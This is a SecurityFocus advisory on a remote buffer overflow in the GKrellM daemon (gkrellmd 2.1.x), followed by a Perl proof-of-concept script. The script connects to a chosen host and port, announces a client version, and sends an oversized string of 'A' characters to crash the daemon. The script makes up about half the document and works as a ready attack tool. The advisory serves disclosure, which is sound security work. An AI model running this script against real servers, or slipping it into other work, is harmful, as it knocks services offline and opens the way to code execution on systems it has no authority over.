source: http://www.securityfocus.com/bid/8022/info

GKrellMd has been reported prone to a remote buffer overflow vulnerability, arbitrary code execution is possible.

The issue presents itself due to a lack of sufficient bounds checking performed on network-based data. If data exceeding the maximum reserved memory buffer size is received arbitrary memory may be corrupted.

A remote attacker may ultimately exploit this issue remotely to seize control of the affected daemon and execute arbitrary code.

This vulnerability has been reported to affect Gkrellm 2.1.13.

	#!/usr/bin/perl -s
	use IO::Socket;
	#
	# proof of concept code
	# tested: grkellmd 2.1.10
	#



		if(!$ARGV[0] || !$ARGV[1])
		{ print "usage: ./gkrellmcrash.pl <host> <port>\n"; exit(-1); }

	$host = $ARGV[0];
	$port = $ARGV[1];
	$exploitstring = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

	$socket = new IO::Socket::INET
	(
	Proto    => "tcp",
	PeerAddr => $host,
	PeerPort => $port,
	);

	die "unable to connect to $host:$port ($!)\n" unless $socket;

	print $socket "gkrellm 2.1.10\n"; #tell the daemon wich client we have
	sleep(1);
	print $socket $exploitstring;

	close($socket);